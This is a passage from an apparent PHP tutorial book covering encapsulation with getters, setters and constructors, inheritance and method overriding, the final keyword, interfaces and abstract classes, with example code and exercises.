 return $this->name;  
 }  
  
 // Setter for property $name  
 public function setName($newName) {  
 $this->name \= $newName;  
 }  
  
 // Getter for $age property  
 public function getAge() {  
 return $this->age;  
 }  
  
 // Setter for property $age  
 public function setAge($newAge) {  
 $this->age \= $newAge;   
 }  
 }

 

 

This PHP code defines a Users class with two private properties: $name and $age. It then declares four methods:

 

**getName():** This is a getter for the $name property. It retrieves the value of the $name property.

**setName($newName):** This is a setter for the $name property. It is used to set a new value for the $name property.

**getAge(): This is** a getter for the $age property. It retrieves the value of the $age property.

**setAge($newAge):** This is a setter for the $age property. It is used to define a new value for the $age property.

Getters are used to access private property values from outside the class, while setters are used to modify these values in a controlled way. In this way, the class guarantees data encapsulation by allowing controlled access to properties.

 

To demonstrate the use of the getters and setters methods of the Users class, let's integrate the following code into the index.php file:

 

 

<?php  
 require\_once "Users.php";  
  
 // Instantiate the User object  
 $user1 \= new Users();  
  
 // Use getters and setters methods  
 $user1->setName("Alice");  
 $user1->setAge(25);  
  
 echo "User name: " . $user1->getName() . "<br\>";  
 echo "User age: " . $user1->getAge();

 

This PHP code illustrates the use of the getters and setters methods of the Users class. First, the Users class is included using require\_once. Next, a new User object is instantiated under the name $user1. The setName() and setAge() methods are used to set the user's name and age, respectively. Finally, the getName() and getAge() methods are used to retrieve and display the user's name and age, respectively. When you run the index.php file, you'll get a result similar to the following:

 

![Image](images/image-178.png)

 

### Advantages of using getters and setters

 

Using getters and setters has several advantages in object-oriented programming:

 

Encapsulation: getters and setters are used to control access to object properties. By defining properties as private or protected, and providing public methods for accessing and modifying them, we guarantee greater control over data manipulation, which promotes encapsulation.

 

Data validation: Setters can include checks and validations to ensure that the data assigned to a property is valid. For example, you can check whether a value is in a specific range, whether it respects a particular format, etc.

 

Flexibility: By using getters and setters, you can easily modify the way data is manipulated within the class without having to modify the client code that uses the class. This allows for greater modularity and flexibility in object management.

 

Code reuse: getters and setters facilitate code reuse by encapsulating data manipulation logic within the class. This reduces code duplication and enhances code maintainability.

 

Let's imagine that in the Users class, we want to ensure that the age assigned to a user is a positive integer. Here's an example of data validation with getters and setters:

 

<?php  
 class Users {  
 private $age;

  
 // Setter for $age property with validation  
 public function setAge($newAge) {

  
 // Check if age is a positive integer  
 if (is\_int($newAge) && $newAge \>= 0) {  
 $this->age \= $newAge;  
 } else {

  
 // In case of invalid age, display an error message  
 echo "Age must be a positive integer ";   
 }  
 }  
 // Getter for $age property  
 public function getAge() {  
 return $this->age;  
 }  
 }

 

In this code, the public setAge() method is a setter that sets the age value with validation. It takes an argument $newAge and first checks whether it's a positive integer by using the **is\_int()** function and checking whether $newAge is greater than or equal to zero. If so, it assigns this value to the current object's $age property. Otherwise, it displays an error message indicating that the age must be a positive integer.

 

The public getAge() method is a getter that retrieves the age value. It simply returns the value of the current object's $age property.

 

Using this model ensures that the age value is always valid, thus avoiding data errors. Here's an example:

 

<?php  
  
 require\_once "Users.php";  
  
 // Instantiate the Users object  
 $user1 \= new Users();  
  
 // Use setter to set age  
 $user1->setAge(30); // This works because 30 is a positive integer  
  
 // Use getter to retrieve age  
 echo "User's age: " . $user1->getAge(); // Will display : User's age: 30  
 echo "<br\>";  
  
 // Attempt to use setter with invalid value  
 $user1->setAge(\-10); // Display : Age must be a positive integer.  
  
 // Use the getter after an attempt with an invalid value  
 echo "User's age: " . $user1->getAge(); // Display : User age: 30 (age has not been modified)

 

In this code, we use the setter setAge() to set the user's age to 30. This operation succeeds because 30 is a positive integer.

 

We use the getAge() getter to retrieve the user's age and display it on the screen. In this case, it will display "User age: 30".

 

Next, we try to use the setter setAge() again, but this time with an invalid value, -10. As this value is invalid, the setter displays the error message "Age must be a positive integer."

 

Finally, we use the getAge() getter again to display the user's age. As the previous attempt with an invalid value failed to modify the age, this instruction will again display "User age: 30".

When this code is executed, you will get the following result:

 

![Image](images/image-179.png)

 

## Class constructor

 

In PHP object-oriented programming, the constructor plays an essential role in the creation and initialization of objects. The constructor is a special method of a class that is automatically called when a new object of that class is instantiated. Its main purpose is to perform the initialization tasks required to set the object's initial state.

 

The constructor allows you to define how the object's properties are to be configured from the moment it is created, providing a convenient way of ensuring that objects are created in a consistent and valid state. In other words, it provides a means of ensuring that the data required for the object is available and correctly initialized from the outset.

 

In this section, we'll explore the PHP constructor concept in detail, examining its syntax, practical use and implications for data modeling and object management. We'll see how to define and use constructors in our classes, as well as the best practices associated with their implementation. By understanding the role and importance of the constructor, PHP developers will be better equipped to design robust classes and well-structured object-oriented applications.

 

### Creating a class constructor

 

Here's a practical example illustrating the creation and use of a constructor in the Users class:

 

<?php  
 class Users {  
 private $name;  
 private $firstname;  
 private $age;  
 private $email;  
  
 // Constructor of the Users class  
 public function \_\_construct($name, $firstname, $age, $email) {  
 $this->name \= $name;  
 $this->firstname \= $firstname;  
 $this->age \= $age;  
 $this->email \= $email;  
 }  
  
 // Getter for user name  
 public function getName() {  
 return $this->name;  
 }  
  
 // Getter for user's first name  
 public function getFirstname() {  
 return $this->firstname;  
 }  
  
 // Getter for user's age  
 public function getAge() {  
 return $this->age;  
 }  
  
 // Getter for user's email address  
 public function getEmail() {  
 return $this->email;  
 }  
 }

 

 

This PHP code defines a class called Users. This class has four private attributes: $name, $firstname, $age and $email. It also has a **constructor**. The constructor is a special method that always has the same name **\_\_construct()**. This method is automatically called when a new Users object is created. Its main role is to initialize the object's properties with the values supplied when the class is instantiated.

 

Here's what the builder does in detail:

 

Parameters: The constructor takes four parameters: $name, $firstname, $age and $email. These parameters represent the initial values of the object's attributes.

 

Attribute initialization: Within the constructor, parameter values are assigned to the object's corresponding attributes using the $this-> operator. For example, $this->name = $name; assigns the value of the $name parameter to the $name attribute of the object under construction.

 

In addition to the **constructor**, the Users class has four public methods called getters: getName(), getFirstName(), getAge() and getEmail(). These methods retrieve the values of the private attributes $name, $firstname, $age and $email respectively. They are used to access object data from outside the class in a controlled and secure manner.

 

### Use during instantiation

 

When you create a new Users object using the constructor, you must supply the parameter values. For example, if you make $user1 = new Users("Dupont", "Alice", 30, "dupont.alice@example.com");, the constructor will be called with the specified values, and these values will be assigned to the corresponding attributes of the $user1 object. In the index.php file, insert the following code:

 

  
<?php  
 require\_once "Users.php";  
  
 // Instantiate the Users class with the constructor  
 $user1 \= new Users("Dupont", "Alice", 30, "dupont.alice@example.com");  
  
 // Display user information  
 echo "User name: " . $user1->getName() . "<br\>";  
 echo "User first name : ".$user1->getFirstname()."<br\>";  
 echo "User's age: " . $user1->getAge() . "<br\>";  
 echo "User email: " . $user1->getEmail();

 

 

This code illustrates the instantiation of the Users class using the constructor. When we create a new Users object, we pass the values "Dupont" for the last name, "Alice" for the first name, 30 for the age and "dupont.alice@example.com" for the e-mail address to the constructor. These values are then used to initialize the corresponding properties of the Users object.

 

Next, we use getters to retrieve the user's information and display it on the screen. We use the getName(), getFirstName(), getAge() and getEmail() methods to get the user's last name, first name, age and e-mail address respectively, and display them in the browser.

When you run this code, you will get the following result:

 

![Image](images/image-180.png)

 

## Conclusion

In this chapter on encapsulation and data modeling in object-oriented programming, we have explored the fundamental concepts involved in structuring and protecting data within an application. We began with encapsulation, which consists of grouping data and associated methods within classes, while defining visibility levels to control access to these elements.

 

We then looked in detail at the getters and setters methods, which provide a secure and controlled means of accessing and modifying a class's private properties. Using these methods, we saw how to guarantee data integrity and reinforce encapsulation by preventing direct access to private properties.

 

We have also examined the advantages of using getters and setters, particularly in terms of flexibility, maintainability and code security. By using specific methods to access data, we can easily implement data validation and processing logic, while preserving encapsulation and minimizing the risk of data corruption.

 

Finally, we looked at the essential role of the constructor in creating objects and initializing their properties. By defining an appropriate constructor, we can ensure that objects are correctly configured as soon as they are created, contributing to a safer and more consistent use of our classes.

 

In conclusion, encapsulation and data modeling are key concepts in object-oriented programming, enabling the design of robust, modular and easily maintainable applications. By understanding and applying these principles, developers can create more efficient and reliable software systems, guaranteeing data protection and integrity throughout their lifecycle.

 

## EXERCISES

 

### Exercise 26

 

Create a class Person that contains the following properties:

 

$name: the person's name

$age: the person's age

The Person class must have the following methods:

 

*   \_\_construct($name, $age): a constructor that initializes the name and age properties
*   getName(): a method that returns the person's name
*   getAge(): a method that returns the person's age
*   setAge($age): a method that modifies the person's age

 

Create an instance of the Person class and display its name and age. Then, modify the person's age and display the new value.

 

### Exercise 27

 

Create a class Vehicle with the following attributes: brand, model, year, price. The attributes should be defined in the constructor.

 

The class must have getters and setters for each attribute, as well as a display() method that displays the vehicle's information as a string.

 

Then, create an object (vehicle1) of type Vehicle with initial information and use the display() methods and setters to modify the information of the created vehicle.

 

# Chapter 16

# Inheritance in PHP

#  

 

Inheritance is one of the fundamental concepts of object-oriented programming. It allows a class to inherit properties and methods from another class, called a parent or base class. In PHP, inheritance offers a powerful mechanism for reusing code and structuring applications.

 

This chapter will focus on exploring inheritance in PHP, examining in detail its syntax, benefits and best practices. We'll discover how to create class hierarchies, access inherited members, and redefine methods to customize them to the specific needs of a child class. In addition, we'll discuss important considerations when using inheritance in software development.

 

Understanding inheritance is essential to mastering object-oriented programming in PHP and to designing more modular, scalable and maintainable applications. So let's delve into the world of inheritance in PHP and discover how it can enrich our development practices.

 

 

## Defining inheritance in object-oriented programming

Inheritance is a key concept in object-oriented programming (OOP), which enables a class to inherit the characteristics (properties and methods) of another class called its parent or base class. With inheritance, a child class can reuse and extend the behavior of its parent class, thus promoting code reuse and the logical structuring of applications.

 

In PHP, inheritance is implemented using the **extends** keyword, which allows a child class to extend a parent class by inheriting its public and protected members. In this way, the child class can access the properties and methods of its parent class as if they were defined locally in its own class definition.

 

![Image](images/image-181.png)

 

Let's illustrate the concept of inheritance with a simple example:

 

Let's create a new file named "Person.php", in which we define a class with the same name, i.e. "Person" :

 

<?php  
 // Parent class  
 class Person {  
 protected $name;  
 protected $age;  
  
 // Constructor  
 public function \_\_construct($name, $age) {  
 $this\->name \= $name;  
 $this\->age \= $age;  
 }  
  
 // Method to display person's details  
 public function displayDetails() {  
 echo "Name: " . $this\->name . ", Age: " . $this\->age . " years";  
 }  
 }

 

This code defines a class called Person. This class has two properties defined by the **protected** keyword: $name and $age, which represent the person's name and age respectively. The protected keyword is a visibility level in object-oriented programming used to define access to a class's properties and methods. When a member (property or method) is declared as protected, it is accessible within the class in which it is defined, as well as in derived classes (child classes) that inherit from this class, but not outside these classes.

 

In concrete terms, this means that protected members are not directly accessible outside the class where they are declared, but can be used in child classes that inherit from this parent class. This provides an additional level of encapsulation and security, as protected members are not exposed outside the class hierarchy, but can be used by subclasses to extend or specialize the behavior of the parent class.

 

The constructor of the Person class is defined to initialize these properties when a new object of type Person is created. It takes two parameters, $name and $age, and uses them to initialize the corresponding object properties.

 

The Person class also has a public displayDetails() method, which displays the person's details, such as name and age, using the concatenation operator (.) to form a string containing these details.

 

Now let's create a new file called Employe.php in which we define a class with the same name that inherits from the Person class:

 

<?php  
 require\_once 'Person.php';  
  
 class Employee extends Person {  
 private $salary;  
  
 public function \_\_construct($name, $age, $salary) {  
 parent::\_\_construct($name, $age);  
 $this\->salary \= $salary;  
 }  
  
 public function displayEmployeeDetails() {  
 parent::displayDetails();  
 echo ", Salary: $ " . $this\->salary ;

  
 }  
 }

 

 

This code defines a class called "Employee" that extends the parent class "Person". Here's a detailed explanation of each part of the code:

 

require\_once 'Person.php';: This line includes the file "Person.php", which contains the parent class "Person". This allows the "Employee" class to extend the "Person" class.

 

class Employee extends Person {...}: This class declaration, using the extends keyword, creates the "Employee" class as a child of the "Person" class. This means that the "Employee" class will inherit the properties and methods of the "Person" class.

 

private $salary;: This is a declaration of a new private property specific to the "Employee" class. It stores the employee's salary.

 

public function \_\_construct($name, $age, $salary) {...}: This is the constructor of the "Employee" class. It takes three parameters: the name, age, and salary of the employee. The parent::\_\_construct() function calls the constructor of the parent class "Person" with the name and age. Note the use of the double colon operator (::) to call the parent constructor. Then, the employee's salary is initialized with the value passed as an argument.

 

public function displayEmployeeDetails () {...}: This is a method added to display the details of the employee by using the displayDetails() method of the parent class "Person", and then adds the display of the salary. The parent::dispalyDetails() method calls the displayDetails() method of the parent class "Person" to display the employee's name and age, and then adds the employee's salary to the display.

 

In summary, this code creates an "Employee" class that inherits functionalities from the "Person" class and adds an additional property to store the employee's salary. The constructor initializes all necessary properties, while the "displayEmployeeDetails()" method displays the details of the employee, including their salary.

 

To evaluate the functionality of inheritance, insert the following code into the index.php file.

 

<?php  
 require\_once 'Person.php';  
 require\_once 'Employee.php';  
  
 // Instantiate the Employe class  
 $employee1 = new Employee("John Dupont", 35, 50000);  
  
 // Display employee details  
 $employee1\-> displayEmployeeDetails();  
?>

 

 

This code begins by including the Person.php and Employee.php class files using the require\_once directive. It is necessary to include these classes in order to use them.

Next, an instance of the Employee class is created with the details provided: name, age and salary. Finally, the displayEmployeeDetails() method is called on the $employe1 object to display the employee's details, including name, age and salary.

Executing this code will produce the following result:

 

![Image](images/image-182.png)

 

## Redefining methods

Method redefinition, also known as method substitution or method overloading, is an inheritance feature in object-oriented programming that allows a child class to provide a specific implementation of a method already defined in its parent class. This means that the child class can provide its own implementation of the inherited method, which replaces that of the parent class when called on objects of the child class.

In PHP, methods are redefined by declaring a method in the child class with the same signature (name and parameters) as that of the parent class. When this method is called on an object of the child class, it is the child class implementation that is executed, even if the method has been inherited from the parent class.

This allows the child class to addition or modify behavior inherited from the parent class, while maintaining the same interface (method signature) for class users. This favors code reuse and enables object behavior to be adapted to the specific needs of the child class.

 

For example, the displayDetails() method of the "Person" class can be redefined in the Employee class as follows:

 

<?php  
 require\_once 'Person.php';  
  
 class Employee extends Person {  
 private $salary;  
   
 public function \_\_construct($name, $age, $salary) {  
 parent::\_\_construct($name, $age);  
 $this->salary \= $salary;  
 }  
  
 public function displayDetails() {  
 parent::displayDetails();  
 echo ", Salary: $ " . $this->salary;

 }  
 }  
?>

 

In this Employer class, the displayDetails() method of the Person class is redefined to include the employee's salary. When we call this method on an object in the Employer class, the specific redefinition in the Employer class is used, overriding the method inherited from the Person class. In other words, when we invoke the displayDetails() method on an object created from the Employer class, it's the version of this method defined in the Employer class that will be executed, rather than the one defined in the Person class.

 

The advantage of redefining methods as part of the inheritance process lies in the ability to customize the behavior of inherited methods to suit the specific needs of the child class. This allows for greater modularity and extensibility of code, as a child class can extend or modify the behavior of inherited methods without altering the code of the parent class. In this way, each class can have its own specific functionality while benefiting from the common features defined in the parent class, which encourages code reuse and facilitates maintenance.

 

Note that a child class can always redefine the methods of the parent class if these methods are declared as public or protected in the parent class. This allows the child class to customize the behavior of inherited methods to suit its specific needs. However, if the parent class method is declared as private, it cannot be redefined in the child class, as it is not accessible outside the parent class.

 

However, if you wish to prevent a method from being redefined in a child class, simply use the **final** keyword when defining the method. In fact, when a method is declared as final in a parent class, this means that it cannot be redefined in daughter classes that inherit from this parent class. This guarantees that the behavior of the method will not be modified in the daughter classes, thus ensuring a certain stability and predictability in code design.

 

For example, you cannot redefine the displayDetails() method if it is declared with the final keyword :

 

 

 final public function dispalyDetails() {  
 echo "Name: " . $this->name . ", Age: " . $this->age . " years";  
 }

 

 

In this case, if you redefine this method in the Employee class and run the index.php file, you'll get an error indicating that a method in the Employee class is trying to redefine a method that has been declared as final in the Person class.

 

![Image](images/image-183.png)

 

## Successive Inheritance

Successive inheritance, also known as cascade inheritance, is an object-oriented programming concept where a class inherits not only the attributes and methods of its direct parent class, but also the attributes and methods of all the parent classes of that parent class, thus forming an inheritance chain. For example, a class D may inherit from a class C, which in turn inherits from a class B, which in turn inherits from a class A.

 

###  

### Objectives of successive inheritance

 

Code Reusability: Allows reusing the code already written in parent and grandparent classes, which promotes modularity and code maintenance.

 

Feature Extension: Allows extending the functionalities of a class by adding new attributes and methods while inheriting functionalities from parent classes.

 

Practical example:

Let's look at an example where we have the Animal, Mammal and Dog classes. The Animal class is the base class, the Mammal class inherits from the Animal class, and the Dog class in turn inherits from the Mammal class. This relationship creates a successive inheritance.

 

Here is an example of the code:

 

Animal.php :

 

 

<?php  
  
 // Parent class  
 class Animal {  
 public function eat() {  
 echo "The animal eats. ";  
 }  
 }

 

 

 

Mammal.php :

 

<?php

  
 require\_once "Animal.php";  
  
 // Class inheriting from Animal  
 class Mammal extends Animal {  
 public function breastfeed() {  
 echo "The mammal nurses. ";  
 }  
 }

 

 

Dog.php :

 

<?php  
  
 require\_once "Animal.php";  
 require\_once "Mammal.php";  
  
 // Class inheriting from Mammal  
 class Dog extends Mammal {  
 public function bark() {  
 echo "The dog barks. ";  
 }  
 }

 

 

index.php :

 

  
<?php  
require\_once 'Animal.php';  
require\_once 'Mammal.php';  
require\_once 'Dog.php';  
  
// Using the classes  
$dog = new Dog();  
$dog\->eat(); // Will display: The animal is eating.  
$dog\->breastfeed(); // Will display: The mammal is breastfeeding.  
$dog\->bark(); // Will display: The dog is barking.  
  
require\_once 'Animal.php';  
require\_once 'Mammal.php';  
require\_once 'Dog.php';  
  
// Using the classes  
$dog = new Dog();  
$dog\->eat(); // Will display: The animal is eating.  
$dog\->breastfeed(); // Will display: The mammal is breastfeeding.  
$dog\->bark(); // Will display: The dog is barking.  
?>

 

In this example, the Dog class inherits the Eat() and Breastfeed() methods from its parent classes Mammal and Animal, respectively. This illustrates successive inheritance in action. When index.php is executed, you'll get the following result:

 

![Image](images/image-184.png)

 

### Depth of inheritance

 

There is generally no specific limit to the number of times you can successively inherit from a class in object-oriented programming. However, it's important to take your system design into account and avoid excessive inheritance depth, as this can make code difficult to understand, maintain and extend.

Excessive inheritance depth can lead to increased complexity, strong dependency between classes and an overly rigid hierarchy, which can make code fragile and difficult to modify.

In short, although you can technically make a successive inheritance as many times as necessary, it's best to design your system to promote clarity, flexibility and ease of maintenance.

 

To stop successive inheritance, you can use the final keyword in the declaration of a class or method. When a class is declared as final, this means that it cannot be extended by other classes. Similarly, when you declare a method as final, it means that it cannot be redefined (or overloaded) in child classes.

Here's how to use the final keyword to stop successive inheritance in the Mammal class:

 

<?php  
 require\_once "Animal.php";  
  
 // Class inheriting from Animal  
 class Mammal extends Animal {  
 public function breastfeed() {  
 echo "The mammal nurses. ";  
 }  
 }

 

 

In this code, we have the Mammal class, which inherits from the Animal class. The use of the keyword **final in** front of the Mammal class declaration means that this class is final, which means that it cannot be extended by other classes. In other words, no class can inherit from the Mammal class. 

## Objectives and benefits of using inheritance

The use of inheritance in software design offers several key advantages and objectives:

 

**Code reusability**: Inheritance allows for the reuse of code already implemented in a parent class, thereby reducing code duplication and promoting more efficient and modular software design.

 

**Modularity and structure**: By inheriting functionality from a parent class, child classes can be organized hierarchically, facilitating logical structuring and code maintenance.

 

**Extension and customization**: Child classes can extend the behavior of their parent class by adding new features or redefining existing ones. This allows flexible customization of object behavior based on the specific needs of each child class.

 

**Abstraction and polymorphism**: As we will see in subsequent chapters, inheritance promotes the creation of hierarchies of abstract classes that represent general concepts in an application. By using abstract classes and interfaces, inheritance also facilitates the implementation of polymorphism, where objects of different classes can be treated uniformly.

 

Together, these objectives and advantages make inheritance a powerful tool for designing and implementing robust, scalable, and maintainable software in PHP and other object-oriented programming languages.

##  

## Conclusion

In this chapter, we've explored the concept of inheritance in object-oriented programming in depth. We've seen how classes can inherit properties and methods from other classes, as well as the benefits and objectives of using inheritance in web design.

 

Inheritance creates a hierarchy between classes, where daughter classes can benefit from the functionality of parent classes while extending or customizing their behavior. This encourages code reuse, reduces redundancy and facilitates software maintenance.

 

We also covered advanced concepts such as method redefinition, the use of the **final** keyword to prevent subsequent inheritance, and successive inheritance.

 

By fully understanding inheritance and applying it appropriately, developers can design flexible, modular and extensible software architectures that effectively meet the changing needs of development projects.

 

 

### Exercise 28 (following Exercise 27):

 

Create a class Car that inherits from the Vehicle class, with an additional attribute number\_doors. The Car class should also have a constructor that takes this additional attribute into account.

 

The Car class should have getters and setters for the number\_doors attribute, as well as a display() method that displays the car's information as a string, also calling the display() method of the parent class.

 

Then, create an object of type Car with initial information and use the display() methods and setters to modify the car's information.

# Chapter 17

# Interfaces and abstract classes

 

 

In the world of object-oriented programming in PHP, interfaces and abstract classes play a crucial role in the design of modular, flexible and extensible software. These concepts offer powerful mechanisms for defining contracts and basic structures, enabling developers to create well-organized, easily maintainable hierarchies of classes.

 

In this chapter, we'll explore interfaces and abstract classes in depth, starting with a clear definition of these concepts. We'll examine their syntax, characteristics and fundamental differences, as well as the advantages they offer in software design. In addition, we'll look at concrete examples to illustrate their use in real-life situations, and discuss best practices for exploiting their full potential. This chapter will provide you with the information you need to master interfaces and abstract classes in PHP.

 

 

## PHP interfaces

Interfaces in PHP are powerful object-oriented programming tools for defining contracts that classes must respect. They offer a structured way of declaring the methods a class must implement, without providing details on how these methods are to be implemented. In other words, interfaces define what a class can do, but not how it does it.

 

In this section, we'll take a closer look at interfaces in PHP. We'll discover how to declare and use interfaces, the syntax of interfaces in PHP, the methods they can contain, and how classes implement these interfaces. We'll also look at the benefits of using interfaces in software design.

 

Interfaces play a crucial role in the creation of modular, flexible and extensible code. Their use guarantees the consistency and conformity of classes within a system, while facilitating class substitution and polymorphism. Let's take a closer look at the different facets of interfaces in PHP.

 

### Interface declaration and syntax

 

Interfaces are declared using the **interface** keyword followed by the interface name. They provide a list of methods that a class must implement. To use an interface, a class must implement all the methods defined in the interface.

 

The syntax for declaring an interface is as follows:

 

![Image](images/image-185.png)

 

Interfaces can contain only method signatures, without method bodies. This means that methods declared in an interface have no function body, only method declarations. Here's an example of code for an interface called Connectable, which you put into a new Connectable.php file.

 

<?php  
  
 // Interface declaration  
 interface Connectable {  
 // Connect method  
 public function connect();  
  
 // Disconnect method  
 public function disconnect();  
 }  
  
?>

 

In this example, we've declared an interface called "Connectable", which contains two methods: "connect()" and "disconnect()". This interface defines a contract that classes must respect when implementing these methods. Classes implementing this interface must provide an implementation for each of these methods.

Note that interface names must be descriptive, clearly indicating the interface's role or function. Interface names are generally singular and often begin with a capital letter, like classes. For example: Connectable, Loggable, Calculable, etc.

 

### Implementing interfaces in classes

 

To use interfaces, one or more classes can implement one or more interfaces using the implements keyword. When a class implements an interface, it must provide concrete definitions for all the methods defined in the interface.

 

Create a new Database.php file, and implement the Connectable interface as follows:

 

<?php  
 require\_once 'Connectable.php';  
  
 class Database implements Connectable {  
 public function connect() {  
 echo "Database connection established.";  
 }  
  
 public function disconnect() {  
 echo "Database disconnected.";  
 }  
 }  
  
?>

 

This code defines a class called Database, which implements the Connectable interface. The Connectable interface contains two methods: connect() and disconnect(), which must be implemented by all classes that use it.

 

Both methods are implemented in the Database class. The connect() method displays a message indicating that a connection to the database has been established, while the disconnect() method displays a message indicating that the connection to the database has been closed.

 

In short, this Database class can be used to manage connections to a database, using the Connectable interface to ensure that all classes implement the methods needed to connect to and disconnect from the database in a consistent way.

 

And in an index.php file, you can use the Connectable interface and the Database class:

 

<?php

  
 require\_once 'Database.php';  
 $database \= new Database();  
 $database->connect();  
 echo "<br\>";  
 $database->disconnect();

  
?>

 

This code begins by including the Database.php file, which contains the definition of the Database class we've just seen. Next, an instance of the Database class is created using the default constructor. Finally, the connect() and disconnect() methods of this instance are called successively.

 

This means that the connection to the database is established by calling the connect() method, which displays a message indicating that the connection has been established. Next, the disconnect() method is called to close the connection, which displays a message indicating that the connection has been closed. When you run this code, you will get a result similar to the following outcome:

 

![Image](images/image-186.png)

 

 

### Interface implementation and class behavior

 

When we define a Person interface, for example, we establish a behavioral contract that all classes implementing it must adhere to. If we have, for instance, the classes Author, Teacher, Student, and Admin that implement this interface, it means that each of these classes must provide an implementation for all methods declared in the Person interface.

 

For example, the Person interface may define methods such as getName(), getAge(), and introduceYourself(), which are essential for all classes implementing this interface. Each concrete class must then provide an implementation for these methods to adhere to the contract defined by the Person interface.

 

While each class implementing the Person interface must provide an implementation for all methods declared in that interface, these implementations can differ from one class to another. Each class can have its own specific behaviors based on its role or particular characteristics.

 

For instance, the introduceYourself() method might display a different introduction for an author compared to a teacher, as their roles and attributes may differ. Similarly, the getRole() method could return different values depending on the type of person, indicating whether they are an author, a teacher, a student, an administrator, etc.

 

The Person interface simply provides a contract ensuring that all classes implementing it will have certain basic functionalities in common. However, the specific details of these functionalities may vary depending on the context and the expected behavior for each type of person.

### ![Image](images/image-187.png)

###  

### Multiple use of interfaces

 

In object-oriented programming, it is often necessary for a class to be able to implement several interfaces in order to benefit from the functionality offered by each of them. This ability to implement multiple interfaces is known as "multiple interface usage". In PHP, a class can implement as many interfaces as required, enabling it to define a complete set of behaviors according to the different interfaces it implements.

 

The multiple use of interfaces offers greater flexibility and modularity in class design. This allows different functionalities to be separated into distinct interfaces, making the code more readable, more maintainable and easier to extend. It also facilitates code reuse, as a class can be used in different contexts by implementing the appropriate interfaces.

 

To implement several interfaces in a PHP class, simply list the interface names separated by commas in the class declaration. For example:

 

Defining IntefaceA in a new InterfaceA.php file

 

 

 interface InterfaceA {  
 public function methodA();  
 }

 

 

Defining IntefaceB in a new InterfaceB.php file

 

 

 interface InterfaceB {  
 public function methodB();  
 }

 

 

Defining IntefaceC in a new InterfaceC.php file

 

 

 interface InterfaceC {  
 public function methodC();  
 }

 

 

Define the MyClass class in a new MyClass.php file.

 

 

 class MyClass implements InterfaceA, InterfaceB, InterfaceC {  
 public function methodeA() {  
  // methodA implementation  
 }  
  
 public function methodeB() {  
  // methodeB implementation  
 }

 

 public function methodeC() {  
  // methodC implementation  
 }  
 }

 

 

In this example, the MyClass class implements InterfaceA, InterfaceB and InterfaceC, so it must provide implementations for all the methods defined in these interfaces. This allows MyClass to access the functionality defined in both interfaces, and to be used wherever one or other of the interfaces is expected. The multiple use of interfaces is a powerful concept for creating flexible, modular classes, and contributes to the robustness and maintainability of object-oriented applications.

 

### Advantages of using interfaces

 

Interfaces in programming offer several advantages and functionalities:

 

**Clear and consistent contract**: Interfaces define a set of methods that a class must implement. This creates a clear contract between developers, indicating which functionalities are available and how they should be used.

 

**Flexibility and extensibility**: Interfaces allow defining common behaviors that different classes can implement specifically. This makes the code more flexible and extensible, as new functionalities can be added by simply implementing new interfaces without modifying existing classes.

 

**Code reuse:** Interfaces encourage code reuse by defining standardized functionalities that multiple classes can share. This promotes modular design and facilitates code maintenance.

 

**Dependency on contracts, not implementations**: Using interfaces allows depending on contracts rather than specific implementations. This promotes loose coupling between software components, making the code easier to test, maintain, and update.

 

**Polymorphism**: Interfaces enable applying the principle of polymorphism, where different classes can be treated uniformly through a common interface. This allows writing generic code and manipulating objects in a more abstract way.

 

In summary, interfaces provide a powerful way to define contracts between different parts of a software system, leading to more modular, flexible, and easily extensible code.

## Abstract classes

Abstract classes are a key concept in PHP object-oriented programming. They allow you to define class models that cannot be instantiated directly, but which serve as the basis for other classes that inherit from them. Abstract classes are used when you wish to provide a basic implementation for certain functionalities, while allowing derived classes (child classes) to customize or extend these functionalities according to their specific needs.

 

### Declaring and using abstract classes

 

To declare an abstract class in PHP, use the **abstract** keyword before the **class** keyword. An abstract class can contain both concrete methods (with an implementation) and abstract methods (without an implementation). Abstract methods serve as a "contract" that derived classes must fulfill by providing their own implementation.

 

### Abstract class syntax in PHP

 

Here's an example of how to declare an abstract class in PHP :

 

<?php  
  
 abstract class MyAbstractClass {  
 // Abstract method  
 abstract public function myAbstractMethod();  
  
 // Concrete method  
 public function myConcreteMethod() {  
 // Implementation  
 }  
 }

 

 

This code illustrates the declaration of an abstract class named MyAbstractClass. Here's what each part of the code means:

 

*   The **abstract** keyword in front of the class declaration indicates that it is an abstract class, meaning that it cannot be instantiated directly.
*   The myAbstractMethod() method is declared as an abstract method using the **abstract** keyword. An abstract method is a method that has no body (i.e. no implementation) in the abstract class. Classes that inherit from this abstract class must provide their own implementation for this method.
*   The myConcreteMethod() method is a concrete method, which means it has an implementation in the abstract class. Unlike abstract methods, concrete methods have a body with an implementation. Classes that inherit from this abstract class will also inherit this method with its default implementation, but they can redefine it if necessary.

In short, this abstract class MyAbstractClass provides a base with an abstract method to be implemented by child classes, as well as a concrete method that can be used as is or redefined as needed in derived classes.

 

### Implementing abstract classes

 

Abstract classes cannot be instantiated directly. To use them, you need to create one or more classes that extend them. Here's how to do it:

 

Define a concrete class that extends the abstract class: Create a new class using the **extends** keyword to inherit from the abstract class. This class must provide implementations for all abstract methods defined in the parent abstract class.

 

Implement abstract methods : For each abstract method defined in the parent abstract class, provide an implementation in the child class. Implemented methods must match the signature (name and parameters) of the parent class's abstract methods.

 

Using the concrete class: Once the concrete class has been implemented, you can instantiate it and use its methods in the same way as any other class. You can also further extend the concrete class by creating subclasses that will in turn inherit its functionality.

 

Here's a practical example of how to use an abstract class in PHP :

 

Create an abstract class Shape (Shape.php):

 

<?php  
  
 // Abstract class definition  
 abstract class Shape {  
 abstract public function calculateArea();  
  
 // Concrete method  
 public function displayType() {  
 echo "This shape is of type: " . get\_class($this);  
 }  
 }

 

 

In this code, we define an abstract class named Shape. This class contains an abstract method calculateArea() that must be implemented by all subclasses that extend this class. An abstract method is a method that is declared but not implemented in the abstract class itself. It is up to each subclass to implement this method according to its own logic.

 

In addition to the abstract method, the Shape class also contains a concrete method called displayType(). A concrete method is a method that has an implementation in the abstract class itself. In this case, the displayType() method uses the native PHP function get\_class($this) to retrieve the name of the current object's class (instance of the class), which allows displaying the type of shape.

 

Using concrete methods in an abstract class provides a default implementation that subclasses can use if necessary. These methods can be useful for features shared by all subclasses or for utility functions.

 

To use this abstract class, create a Rectangle class that inherits from the abstract Shape class:

 

<?php  
  
 require\_once "Shape.php";  
  
 // Definition of a concrete class that extends the abstract class  
 class Rectangle extends Shape {  
 private $length;  
 private $width;  
  
 public function \_\_construct($length, $width) {  
 $this\->length \= $length;  
 $this\->width \= $width;  
 }  
  
 // Implementation of the abstract method calculSurface  
 public function calculateArea() {  
 return $this\->length \* $this\->width;  
 }  
 }

 

 

